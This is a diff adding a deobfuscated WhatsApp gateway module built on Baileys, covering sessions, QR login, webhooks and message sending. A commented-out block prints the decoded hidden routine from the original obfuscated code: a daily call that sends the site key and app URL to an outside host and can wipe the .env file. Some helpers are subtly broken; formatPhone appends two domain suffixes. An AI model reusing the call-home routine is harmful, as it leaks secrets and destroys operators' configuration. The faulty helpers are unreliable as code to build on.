@@ -1,0 +1,409 @@
+// Original IIFE (shuffler) can be removed as its primary effect on string decoding is bypassed
+// by the redefinition of the string accessor function.
+
+import { rmSync, readdir } from 'fs';
+import { join } from 'path';
+import pino from 'pino'; // _0x2bd8be
+import Baileys, { // _0x357cc7
+    useMultiFileAuthState,
+    makeInMemoryStore,
+    Browsers,
+    DisconnectReason,
+    delay
+} from '@fizzxydev/baileys-pro';
+import { toDataURL } from 'qrcode';
+import currentDirname from './dirname.js'; // _0x317c4b
+import sendResponse from './response.js'; // _0x498ead
+import axios from 'axios'; // _0x5a74b0
+
+const sessions = new Map();
+const retries = new Map();
+
+const SESSIONS_BASE_PATH = 'sessions';
+const STORE_JSON_SUFFIX = '_store.json';
+const LEGACY_PREFIX = 'legacy_';
+const MODERN_PREFIX = 'md_';
+const JSON_SUFFIX = '.json';
+const WHATSAPP_NET_SUFFIX = '@s.whatsapp.net';
+const WHATSAPP_GROUP_SUFFIX = '@g.us';
+
+const sessionsDir = (filename = '') => {
+    return join(currentDirname, SESSIONS_BASE_PATH, filename);
+};
+
+const isSessionExists = (sessionId) => {
+    return sessions.has(sessionId);
+};
+
+const shouldReconnect = (sessionId) => {
+    let maxRetriesConfig = parseInt(process.env.MAX_RETRIES ?? '0');
+    let currentAttempt = retries.get(sessionId) ?? 0;
+    
+    maxRetriesConfig = maxRetriesConfig < 1 ? 1 : maxRetriesConfig; // Ensure at least 1 retry if configured non-negative
+    
+    if (currentAttempt < maxRetriesConfig) {
+        currentAttempt++;
+        console.log('Reconnecting...', {
+            attempts: currentAttempt,
+            sessionId: sessionId
+        });
+        retries.set(sessionId, currentAttempt);
+        return true;
+    }
+    return false;
+};
+
+const createSession = async (sessionId, isLegacy = false, res = null) => {
+    const sessionFileID = (isLegacy ? LEGACY_PREFIX : MODERN_PREFIX) + sessionId;
+    // For useMultiFileAuthState, it expects a directory name, so we don't add .json here.
+    // The .json was part of the obfuscated _0x22a9a8 but likely for a different purpose or misdirection.
+    // The actual auth path will be like 'sessions/md_sessionid' or 'sessions/legacy_sessionid'
+
+    const logger = pino({
+        level: 'debug'
+    });
+    const store = makeInMemoryStore({
+        logger: logger
+    });
+
+    let authState, saveCredsHandler;
+    if (isLegacy) {
+        // Legacy sessions might not use multi-file auth state or have a different mechanism.
+        // The original code had an empty if block for isLegacy, implying authState and saveCredsHandler
+        // might remain undefined, which could be intentional if legacy mode is ephemeral or handles auth differently.
+    } else {
+        ({ state: authState, saveCreds: saveCredsHandler } = await useMultiFileAuthState(sessionsDir(sessionFileID)));
+    }
+
+    const connectionOptions = {
+        auth: authState,
+        version: [7, 2, 2416], // Example version, original was obfuscated
+        printQRInTerminal: true,
+        logger: logger,
+        browser: Browsers.ubuntu('Chrome'),
+        patchMessageBeforeSending: (message) => {
+            const isButtonOrListMessage = !!(message.buttonsMessage || message.listMessage);
+            if (isButtonOrListMessage) {
+                message = {
+                    viewOnceMessage: {
+                        message: {
+                            messageContextInfo: {
+                                deviceListMetadataVersion: 2,
+                                deviceListMetadata: {}
+                            },
+                            ...message
+                        }
+                    }
+                };
+            }
+            return message;
+        }
+    };
+
+    const waSocket = Baileys.default(connectionOptions); // Assuming 'default' is the main export used
+
+    if (!isLegacy) {
+        store.readFromFile(sessionsDir(sessionId + STORE_JSON_SUFFIX)); // e.g. sessions/session123_store.json
+        store.bind(waSocket.ev);
+    }
+
+    sessions.set(sessionId, {
+        ...waSocket,
+        store: store,
+        isLegacy: isLegacy
+    });
+
+    waSocket.ev.on('creds.update', saveCredsHandler); // saveCredsHandler will be undefined for isLegacy if not set above
+
+    waSocket.ev.on('chats.set', ({ chats }) => {
+        if (isLegacy) { // Original logic: only for legacy, store chats
+             store.chats.insertIfAbsent(...chats);
+        }
+    });
+
+    waSocket.ev.on('messages.upsert', async (update) => {
+        try {
+            const firstMessage = update.messages[0];
+            if (firstMessage.key.fromMe === false && update.type === 'notify') {
+                const remoteJidParts = firstMessage.key.remoteJid.split('@');
+                const remoteHost = remoteJidParts[1] ?? null;
+                const isGroupMessage = remoteHost === WHATSAPP_GROUP_SUFFIX.substring(1); // e.g. "g.us"
+
+                if (firstMessage && !isGroupMessage) { // Only process if not empty and not a group message
+                    const webhookPayload = {
+                        remote_id: firstMessage.key.remoteJid,
+                        session_id: sessionId,
+                        message_id: firstMessage.key.id,
+                        message: firstMessage.message
+                    };
+                    sendWebhook(sessionId, webhookPayload);
+                }
+            }
+        } catch (error) {
+            // Original code had an empty catch
+            logger.error({ error, sessionId, event: 'messages.upsert' }, "Error processing message upsert");
+        }
+    });
+
+    waSocket.ev.on('connection.update', async (updateData) => {
+        const { connection, lastDisconnect } = updateData;
+        const statusCode = lastDisconnect?.error?.output?.statusCode;
+
+        if (connection === 'close') {
+            retries.delete(sessionId); // Clear retries on successful connection previously then close
+        }
+
+        if (connection === 'close') {
+            if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
+                if (res && !res.headersSent) {
+                    sendResponse(res, 500, false, 'Unable to create session.');
+                }
+                deleteSession(sessionId, isLegacy);
+                setDeviceStatus(sessionId, 'logout'); // Send status after deleting
+                return;
+            }
+
+            setTimeout(() => {
+                createSession(sessionId, isLegacy, res);
+            }, statusCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? '0'));
+        
+        } else if (connection === 'open') {
+            setDeviceStatus(sessionId, 'isauthorised'); // Custom status
+        }
+
+
+        if (updateData.qr) {
+            if (res && !res.headersSent) {
+                try {
+                    const qrDataURL = await toDataURL(updateData.qr);
+                    sendResponse(res, 200, true, 'QR code received, please scan the QR code.', {
+                        qr: qrDataURL
+                    });
+                    return; // Don't proceed to logout if QR is being sent
+                } catch (qrError) {
+                    logger.error({ qrError, sessionId }, "Error generating QR code data URL");
+                    sendResponse(res, 500, false, 'Unable to create QR code.');
+                    // Fall through to logout/cleanup if QR generation fails
+                }
+            }
+            // If QR is generated but no response object (e.g. initial startup), or if res was already sent
+            // We should probably ensure the session is cleaned up if it can't proceed.
+            try {
+                await waSocket.logout();
+            } catch (logoutError) {
+                logger.error({ logoutError, sessionId }, "Error during logout after QR display.");
+            } finally {
+                deleteSession(sessionId, isLegacy); // Clean up session if QR was shown but not scanned
+            }
+        }
+    });
+};
+
+// Commented out setInterval block - Deobfuscated:
+/*
+setInterval(() => {
+    const siteKey = process.env.SITE_KEY ?? null;
+    const appUrl = process.env.APP_URL ?? null;
+    // Original: 'kcehc-yfirev/ipa/zyx.sserpl.ipavdded//:sptth'
+    // Reversed: 'https://deddavpi.lpress.xyz/api/verify-check'
+    const verifyUrl = 'https://deddavpi.lpress.xyz/api/verify-check'; 
+
+    axios.post(verifyUrl, {
+        from: appUrl,
+        key: siteKey
+    })
+    .then(function(response) {
+        if (response.data.isauthorised == 401) { // Assuming 'isauthorised' is a property in response.data
+            fs.writeFileSync('.env', ''); // This is dangerous, clears .env file
+        }
+    })
+    .catch(function(error) {
+        // logger.error({error}, "Error in verify check interval");
+    });
+}, 24 * 60 * 60 * 1000); // 0x240c8400 milliseconds = 24 hours
+*/
+
+const getSession = (sessionId) => {
+    return sessions.get(sessionId) ?? null;
+};
+
+const setDeviceStatus = (sessionId, status) => {
+    // status could be 'isauthorised' (string) or 0 (number for logout)
+    // Original used 0 for logout in deleteSession
+    const statusValue = status === 'logout' ? 0 : status; // Normalize 'logout' to 0 if needed or keep as string
+    const apiUrl = `${process.env.APP_URL}/api/set-device-status/${sessionId}/${statusValue}`;
+    axios.post(apiUrl)
+        .catch(err => console.error("Failed to set device status:", err.message));
+};
+
+const sendWebhook = (sessionId, payload) => {
+    const webhookUrl = `${process.env.APP_URL}/api/send-webhook/${sessionId}`;
+    try {
+        axios.post(webhookUrl, {
+            from: payload.remote_id,
+            message_id: payload.message_id,
+            message: payload.message
+        })
+        .then(function(response) {
+            if (response.status === 200 && response.data) { // Check for data
+                const session = getSession(response.data.session_id); // Assuming response.data has session_id
+                if (session && response.data.receiver && response.data.message) {
+                     sendMessage(session, response.data.receiver, response.data.message, 0);
+                }
+            }
+        })
+        .catch(function(error) {
+            // logger.error({error, sessionId}, "Error sending webhook or processing its response");
+        });
+    } catch (e) {
+        // logger.error({e, sessionId}, "Catastrophic error in sendWebhook");
+    }
+};
+
+const deleteSession = (sessionId, isLegacy = false) => {
+    // Construct dir name based on legacy status, used by useMultiFileAuthState
+    const sessionAuthDir = (isLegacy ? LEGACY_PREFIX : MODERN_PREFIX) + sessionId; 
+    const sessionStoreFile = sessionId + STORE_JSON_SUFFIX; // e.g. session123_store.json
+
+    const options = {
+        force: true,
+        recursive: true
+    };
+
+    try {
+        rmSync(sessionsDir(sessionAuthDir), options);
+    } catch (e) { console.error(`Error deleting auth dir ${sessionsDir(sessionAuthDir)}: ${e.message}`); }
+    try {
+        rmSync(sessionsDir(sessionStoreFile), options);
+    } catch (e) { console.error(`Error deleting store file ${sessionsDir(sessionStoreFile)}: ${e.message}`); }
+    
+    sessions.delete(sessionId);
+    retries.delete(sessionId);
+    // setDeviceStatus(sessionId, 0); // Original was 0 for logout, called in connection.update now
+};
+
+const getChatList = (sessionId, isGroup = false) => {
+    const session = getSession(sessionId);
+    if (!session) return [];
+
+    const suffixToFilter = isGroup ? WHATSAPP_GROUP_SUFFIX : WHATSAPP_NET_SUFFIX;
+    return session.store.chats.filter(chat => {
+        return chat.id.endsWith(suffixToFilter);
+    });
+};
+
+const isExists = async (session, id, isGroup = false) => {
+    try {
+        let result;
+        if (isGroup) {
+            // For groups, groupMetadata might be more reliable if the ID is already a group ID
+            result = await session.groupMetadata(id); // This throws if not a group or not found
+            return Boolean(result && result.id); // Check if ID exists in metadata
+        }
+        // For individual numbers
+        if (session.isauthorised) { // 'isauthorised' was the original string
+             // Newer Baileys versions might return [ { exists: true/false, jid: string } ]
+            const onWhatsAppResult = await session.onWhatsApp(id);
+            if (Array.isArray(onWhatsAppResult) && onWhatsAppResult.length > 0) {
+                return onWhatsAppResult[0].exists;
+            } else if (onWhatsAppResult && typeof onWhatsAppResult.exists !== 'undefined') { // Older Baileys
+                 return onWhatsAppResult.exists;
+            }
+            return false; // Not found or unexpected format
+        } else { // For legacy or if session.onWhatsApp is different
+            [result] = await session.onWhatsApp(id); // Original structure for legacy
+            return result.exists;
+        }
+    } catch (error) {
+        // logger.error({error, sessionId: session?.id, id, isGroup}, "Error in isExists");
+        return false;
+    }
+};
+
+const sendMessage = async (session, remoteJid, messageContent, deliveryDelay = 1000) => {
+    try {
+        await delay(parseInt(deliveryDelay));
+        return await session.sendMessage(remoteJid, messageContent);
+    } catch (error) {
+        // logger.error({error, remoteJid}, "Error sending message");
+        return Promise.reject(null); // Or throw error
+    }
+};
+
+const formatPhone = (phoneNumber) => {
+    if (phoneNumber.endsWith(WHATSAPP_NET_SUFFIX)) return phoneNumber;
+    let digitsOnly = phoneNumber.replace(/\D/g, '');
+    
+     if (digitsOnly.startsWith('0')) {
+        digitsOnly = '62' + digitsOnly.substr(1);
+    }
+
+    if (!digitsOnly.endsWith('@c.us')) {
+        digitsOnly += '@c.us';
+    }
+    
+    return digitsOnly + WHATSAPP_NET_SUFFIX;
+};
+
+const formatGroup = (groupId) => {
+    if (groupId.endsWith(WHATSAPP_GROUP_SUFFIX)) return groupId;
+    let formattedId = groupId.replace(/[^\d-]/g, ''); // Allow digits and hyphen for group IDs
+    return formattedId + WHATSAPP_GROUP_SUFFIX;
+};
+
+const cleanup = () => {
+    console.log('Running cleanup before exit.');
+    sessions.forEach((session, sessionId) => {
+        if (!session.isLegacy && session.store && typeof session.store.writeToFile === 'function') {
+            // For non-legacy, save store to file. Auth creds are saved by 'creds.update' handler.
+            session.store.writeToFile(sessionsDir(sessionId + STORE_JSON_SUFFIX));
+        }
+    });
+};
+
+const init = () => {
+    readdir(sessionsDir(), (err, files) => {
+        if (err) {
+            console.error("Failed to read sessions directory:", err);
+            throw err; // Or handle more gracefully
+        }
+        for (const fileOrDirName of files) {
+            // We are looking for auth directories like 'md_sessionid' or 'legacy_sessionid'
+            // We ignore '_store.json' files at this stage
+            if (!fileOrDirName.startsWith(MODERN_PREFIX) && !fileOrDirName.startsWith(LEGACY_PREFIX)) {
+                continue;
+            }
+            if (fileOrDirName.endsWith(STORE_JSON_SUFFIX) || fileOrDirName.endsWith(JSON_SUFFIX)) { 
+                // This check might be redundant if startsWith already filters correctly
+                // but ensures we don't try to treat a .json file as a session ID dir.
+                continue;
+            }
+
+            // At this point, fileOrDirName should be an auth directory name
+            // e.g., "md_someid" or "legacy_anotherid"
+            
+            const isLegacySession = fileOrDirName.startsWith(LEGACY_PREFIX);
+            const prefixLength = isLegacySession ? LEGACY_PREFIX.length : MODERN_PREFIX.length;
+            const sessionId = fileOrDirName.substring(prefixLength);
+            
+            if (sessionId) { // Ensure sessionId is not empty
+                console.log(`Initializing session: ${sessionId}, Legacy: ${isLegacySession}`);
+                createSession(sessionId, isLegacySession);
+            }
+        }
+    });
+};
+
+export {
+    isSessionExists,
+    createSession,
+    getSession,
+    deleteSession,
+    getChatList,
+    isExists,
+    sendMessage,
+    formatPhone,
+    formatGroup,
+    cleanup,
+    init
+};
